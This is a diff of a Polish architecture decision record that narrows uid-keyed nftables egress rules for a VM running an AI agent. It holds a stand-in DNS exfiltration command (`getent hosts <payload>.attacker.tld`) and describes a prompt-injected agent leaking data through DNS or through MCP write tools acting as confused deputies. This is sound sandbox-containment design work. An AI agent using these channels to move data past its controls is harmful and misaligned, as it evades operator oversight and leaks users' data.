@@ -10,8 +10,10 @@ AI-Provenance:
 - Date: 2026-07-29
 - Dotyczy: `internal/lima`, `internal/cli`, ruleset nftables gościa
 - Powiązane: [ADR-0022](0022-mcp-credential-broker.md) (zostawia wyniesienie
-  danych otwarte), [ADR-0023](0023-inference-credential-custody.md) (jawnie
-  opiera się na tej decyzji), [ADR-0003](0003-lima-trust-boundary.md),
+  danych otwarte), [ADR-0023](0023-inference-credential-custody.md) (opiera się
+  na tej decyzji i domyka się nią w całości),
+  [ADR-0026](0026-egress-destination-allowlist.md) (allowlista celów, wydzielona
+  z tej decyzji i wstrzymana), [ADR-0003](0003-lima-trust-boundary.md),
   [ADR-0016](0016-normative-documents-are-corrected-not-archived.md)
 
 ## Context
@@ -23,9 +25,27 @@ nieograniczone wyjście na zewnątrz. ADR-0023 jest ponadto niepełny bez tej
 decyzji — jego broker słucha na loopback TCP, gdzie tożsamości rozmówcy nie
 ustala nikt, a jedyne domknięcie to reguła kluczowana po uid.
 
-`docs/03-architecture.md` wymienia dziś „domenowy egress allowlist" wśród rzeczy
-świadomie poza zakresem. **Ta decyzja to odwraca** i mówi o tym wprost, zamiast
-udawać, że luki nigdy nie było.
+### Ta decyzja została zawężona, i to jest jej najważniejszy zapis
+
+Pierwsza wersja obejmowała dwie rzeczy naraz: reguły kluczowane po uid **oraz**
+wyliczalną allowlistę celów. To drugie jest sprzeczne z `AGENTS.md` §4, który
+wymienia „domenowy network allowlist" wśród rzeczy, których Torio NIE MOŻE
+implementować. `AGENTS.md` jest pierwszym źródłem prawdy (§3) i wyprzedza każdy
+ADR, a §3 tego pliku każe przy sprzeczności stanąć i zgłosić konflikt, nie
+rozstrzygać go po cichu. Poprzednia wersja tego ADR-u odwracała odpowiedni wpis
+z `docs/03-architecture.md`, ale §4 nie wspominała w ogóle.
+
+Konflikt został zgłoszony i rozstrzygnięty przez operatora (2026-07-29) przez
+**rozdzielenie**, nie przez zmianę §4:
+
+- Ta decyzja zostaje przy części kluczowanej po uid. Allowlista **tożsamości**
+  nie jest allowlistą **domen**, więc §4 jej nie dotyczy.
+- Allowlista celów przechodzi do [ADR-0026](0026-egress-destination-allowlist.md),
+  który pozostaje wstrzymany do czasu decyzji operatora o §4.
+
+Zawężenie ma cenę i należy ją nazwać na wejściu, a nie w przypisie: **`hermes`
+zachowuje nieograniczony zbiór celów**. Ta decyzja nie zamyka wyniesienia
+danych i nie wolno jej tak opisywać.
 
 ### Co zostało zweryfikowane na żywej instancji
 
@@ -68,18 +88,43 @@ uid, we własnej tabeli nftables Torio.**
    link-local, więc ruleset napisany wyłącznie dla `ip` przepuściłby po cichu
    cały v6 w dniu, w którym Lima albo Mac dostaną uplink v6.
 
-4. **Przepustki są per-uid i wyliczalne.** `hermes` (agent), `torio-mcp`
-   (broker MCP), `torio-infer` (ADR-0023), `_apt`, `systemd-resolve`,
-   `systemd-timesync`, timery roota, operator. Operator zachowuje normalną sieć —
-   inaczej `git push` z `torio project shell` przestaje działać. Reguły po uid
-   wyrażają dokładnie ten invariant, który `cli.md` próbuje opisać słowami: ta
-   sama VM, dwie różne zdolności, tym razem egzekwowane.
+4. **Przepustki są per-uid, wyliczalne i nie zawężają adresata.** `hermes`
+   (agent), `torio-mcp` (broker MCP), `torio-infer` (ADR-0023), `_apt`,
+   `systemd-resolve`, `systemd-timesync`, timery roota, operator. Operator
+   zachowuje normalną sieć — inaczej `git push` z `torio project shell`
+   przestaje działać. Żadna z tych przepustek nie mówi, dokąd wolno; to jest
+   dokładnie ta część, którą wydziela ADR-0026.
 
-5. **Weryfikacja czyta treść rulesetu, nie jego obecność.** Załadowana, ale
+5. **Jeden wyjątek zawęża adresata i nie jest domeną.** Port brokera inferencji
+   z ADR-0023 na loopbacku jest osiągalny wyłącznie z uid `hermes`. Adresatem
+   jest tu adres loopback ustalony w konfiguracji tego samego gościa, a nie
+   nazwa w internecie — §4 mówi o czym innym. To jest zarazem jedyny powód, dla
+   którego ADR-0023 może zostać przyjęty bez ADR-0026.
+
+6. **Weryfikacja czyta treść rulesetu, nie jego obecność.** Załadowana, ale
    opróżniona tabela przechodzi każdy test pliku i nie egzekwuje niczego — ten
    sam argument, którym ADR-0022 odrzuca obecny-lecz-martwy socket. Kontrola musi
    udowodnić politykę łańcucha i zestaw reguł, oraz że unit jest **enabled i
    active** (`nftables.service` jest dziś `disabled/inactive`).
+
+## Co ta decyzja kupuje, a czego nie
+
+Po zawężeniu lista jest krótka i łatwo ją przecenić, więc stoi tu jawnie.
+
+Kupuje:
+
+- **ADR-0023 przestaje być niepełny.** Loopback TCP nie ustala tożsamości
+  rozmówcy; reguła po uid ustala, i to jest jedyne dostępne domknięcie.
+- **Każda nowa tożsamość na gościu startuje bez sieci.** Pakiet dokładający
+  demona, usługa dołożona przez późniejszą pracę, uid utworzony przez cudzy
+  instalator — żadne z nich nie dostaje wyjścia milcząco. Dziś dostaje.
+- **Zasięg sieciowy każdej tożsamości staje się wyliczalny**, czytany z
+  rulesetu, a nie z tego, co ktoś kiedyś założył.
+
+Nie kupuje **niczego wobec `hermes`**. Agent ma przepustkę bez ograniczenia
+celu, więc prowadzony wstrzykniętą instrukcją wyśle dane dokładnie tak samo jak
+przed tą decyzją. Zdanie „wyniesienie danych zostaje nierozwiązane" z ADR-0022
+pozostaje prawdziwe w całości.
 
 ## Precondition, bez którego ta decyzja nic nie znaczy
 
@@ -100,6 +145,9 @@ to dziś jedyna w całym gościu jednokrokowa ścieżka od uid agenta do roota.
 
 ## Czego ta decyzja NIE zamyka
 
+**Wyniesienia danych przez agenta.** Patrz wyżej: to jest bezpośredni skutek
+zawężenia, nie luka odkryta po fakcie.
+
 **DNS jest kanałem wyniesienia i kluczowanie po uid go nie dotyka.** Każde
 zapytanie wychodzi z gościa jako `systemd-resolved`, uid 991 — **nigdy** jako
 uid agenta. Przepustka na DNS oddaje więc `hermes` dwukierunkowy kanał: dane w
@@ -107,8 +155,7 @@ etykietach zapytania, odpowiedzi w TXT/CNAME, bez żadnego specjalnego narzędzi
 `getent hosts <payload>.attacker.tld` wystarcza. Przypięcie serwera DNS **nie
 pomaga**, bo wyciek jest w nazwie, nie w adresacie. Do rozstrzygnięcia osobno:
 resolwer odrzucający nazwy spoza allowlisty, statyczny `/etc/hosts`, albo jawne
-przyjęcie tego kanału do wiadomości. **Zdanie „wyniesienie danych zostaje
-nierozwiązane" z ADR-0022 pozostaje prawdziwe także po tej decyzji.**
+przyjęcie tego kanału do wiadomości.
 
 **Każdy dopuszczony uid jest confused deputy, a ADR-0022 tworzy jednego
 celowo.** Broker MCP musi sięgać do swojego upstreamu, więc cokolwiek agent
@@ -116,42 +163,28 @@ przepchnie przez przyznane narzędzie **zapisujące** — komentarz w Jirze, str
 w Confluence — opuszcza pudełko czysto, pod dozwolonym uid, wyglądając na ruch
 legalny. Kontrola po uid **przenosi** ten kanał, a nie go zamyka.
 
-Uczciwe podsumowanie wartości: podnosi koszt masowego i przypadkowego wyniesienia
-i czyni zbiór dozwolonych celów wyliczalnym. **Nie powstrzyma zdeterminowanego
-agenta**, bo co najmniej trzy dopuszczone uid-y są z uid 1000 osiągalne.
-
-**Allowlisty nie da się wyprowadzić w całości mechanicznie.** Z
-`projects[].remote` zawsze da się wyciągnąć token hosta — walidacja registry to
-gwarantuje strukturalnie — ale ten token może być **aliasem z konfiguracji SSH**,
-a nie nazwą DNS. Dwa jawne wyjścia: zawęzić registry, odrzucając hosty bez
-kropki (łamiąc kompatybilność), albo rozwijać aliasy przy generowaniu reguł i
-zapisywać rozwinięcie. Milczące potraktowanie aliasu jak nazwy DNS jest trybem
-awarii: reguła powstaje, nie pasuje do niczego, a połączenie ginie z mylącym
-błędem.
-
-**Najbardziej nośny cel nie jest nigdzie zapisany maszynowo.** `model.base_url`
-jest puste, więc endpoint inferencji da się dziś ustalić wyłącznie grepowaniem
-źródeł Hermesa. Allowlista, która o nim zapomni, położy agenta całkowicie.
-
 ## Consequences
 
-- **Sprzężenie z historią obrazu.** `vm bootstrap` pobiera dziś `install.sh` z
-  `hermes-agent.nousresearch.com` i wykonuje `apt-get` wobec `ports.ubuntu.com`
-  **po zwykłym HTTP**. Albo te hosty zostają na allowliście na stałe — czyli
-  mirror apt jako trwała powierzchnia supply-chain — albo przenoszą się do
-  zapieczonego obrazu. To jest realne ograniczenie kolejności prac.
-- Zbiór dozwolonych celów staje się artefaktem, który ktoś utrzymuje. Nowy
-  provider, nowy MCP czy nowy projekt wymagają jawnej zmiany — i to jest cecha,
-  nie koszt, dopóki komunikat o odmowie mówi wprost, czego brakuje.
-- Ubuntu w tle chce wyjścia dla `unattended-upgrades`, `systemd-timesyncd`,
-  `motd-news` i `ua-timer`. Każdy z nich to decyzja: dopuścić albo wyłączyć.
-  Cicha odmowa zamieni je w powtarzające się błędy w logach.
+- **Inwentarz uid staje się artefaktem, który ktoś utrzymuje.** Ubuntu w tle
+  chce wyjścia dla `unattended-upgrades`, `systemd-timesyncd`, `motd-news` i
+  `ua-timer`; nowa usługa gościa to nowa przepustka. Cicha odmowa zamieni je w
+  powtarzające się błędy w logach, więc komunikat musi mówić wprost, której
+  tożsamości brakuje.
 - Pakiet instalujący w przyszłości binarkę setuid-root albo z `cap_net_raw`
   wybije dziurę bez ostrzeżenia, bo jej gniazda niosłyby `skuid 0`. `bootstrap`
   powinien dowodzić inwentarza setuid/getcap tak, jak dowodzi trybów plików.
+- Sprzężenie z historią obrazu — `vm bootstrap` pobierający `install.sh` i
+  wykonujący `apt-get` po zwykłym HTTP — **nie jest już ograniczeniem
+  kolejności prac dla tej decyzji**, bo obie operacje biegną pod uid z
+  przepustką. Wraca w ADR-0026 i tam jest opisane.
 
 ## Rejected
 
+- **Zmiana `AGENTS.md` §4, żeby zmieścić allowlistę celów w tej decyzji.**
+  Odrzucone jako sposób odblokowania *tej* decyzji, nie jako sposób w ogóle. §4
+  jest pierwszym źródłem prawdy; decyzja, która zaczyna od poluzowania
+  ograniczenia, żeby się w nim zmieścić, nie jest ograniczana przez nic.
+  Allowlista celów ma własny ADR i własną drogę przez §4.
 - **Egzekwowanie po stronie hosta (pf).** Podsieci gościa nie ma na żadnym
   interfejsie macOS, a ruch gościa wychodzi z procesu działającego jako operator —
   reguła `user 501` objęłaby cały jego własny ruch. Do tego dopasowywanie po
@@ -161,19 +194,13 @@ jest puste, więc endpoint inferencji da się dziś ustalić wyłącznie grepowa
   gniazda osierocone (patrz Decision 1).
 - **Globalny `nft flush ruleset` przed instalacją własnych reguł.** Kasuje hooki
   DNS Limy i psuje rozwiązywanie nazw w całym gościu.
-- **Allowlista po adresach IP.** CDN-y rotują adresy; reguła psuje się po cichu i
-  w najgorszym momencie. Filtrowanie po nazwie musi się odbywać tam, gdzie nazwa
-  jest widoczna — czyli na proxy po SNI/CONNECT, do którego kernel wymusza ruch.
-- **Przechwytywanie TLS w gościu (MITM CA).** Pozwoliłoby filtrować treść kosztem
-  wstawienia własnego CA do zaufanych. Lekarstwo gorsze od choroby.
-- **Zaniechanie, bo rozwiązanie jest niepełne.** DNS i confused deputy zostają
-  otwarte, a mimo to wyliczalny, egzekwowany zbiór dozwolonych celów jest wart
-  swojej ceny — pod warunkiem, że nigdzie nie zostanie opisany jako szczelny.
+- **Zaniechanie, bo po zawężeniu zostało niewiele.** Zostały trzy rzeczy z
+  sekcji „co ta decyzja kupuje", a jedna z nich jest warunkiem przyjęcia
+  ADR-0023. To wystarcza, pod warunkiem że nigdzie nie zostanie to opisane jako
+  kontrola wyniesienia danych.
 
 ## Niezweryfikowane
 
 Zapisane, żeby nikt nie wziął ich za ustalone: zachowanie `meta skuid` wobec
 gniazd osieroconych na tym hoście; czy pf jest na tym Macu w ogóle włączone; czy
-Lima 2.2.0 wystawia jakikolwiek własny knob na ograniczenie egressu usernetu;
-faktyczny host endpointu inferencji; hosty PyPI/npm/uv-python, wywnioskowane z
-artefaktów w drzewie, a nie odczytane z konfiguracji ani zaobserwowane na łączu.
+Lima 2.2.0 wystawia jakikolwiek własny knob na ograniczenie egressu usernetu.
